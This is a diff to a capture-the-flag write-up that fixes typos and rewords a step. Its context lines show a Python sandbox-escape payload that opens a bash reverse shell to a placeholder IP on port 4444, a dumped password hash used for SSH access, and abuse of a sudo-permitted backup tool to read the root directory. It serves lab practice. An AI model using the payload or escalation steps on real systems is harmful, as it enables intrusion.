@@ -23,7 +23,7 @@
   ```bash
   raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/your_IP/4444 0>&1'", shell=True, stdout=-1).communicate()))
   ```
-- USed netcat to connect to my ip address and got a docker bin
+- Used netcat to connect to my ip address and got a docker bin
 - Manually searched the directories manually and found database.db
 - Dumped the database.db and got the username and password hash
 
@@ -33,7 +33,7 @@
 
 ## ⚓Step 5 (Foothold)
 - ssh into the machine using the obtained hash and username
-- found the user flag
+- Captured the user flag from the home directory
 - Used sudo -l and found out that a bash program called backy can be exploited
 - Searched in the net for info and found out it uses a json input and give a .tar file output which dumps what we gave into the json file
 - Found a json exploit in the net for this
@@ -48,5 +48,5 @@
   }
   ```
 - It dumped a .tar file and extracted the tar file
-- The extracted file contain a root directory in ehich the root flag was present
+- The extracted file contain a root directory in which the root flag was present
 - Captured the root flag 🏴
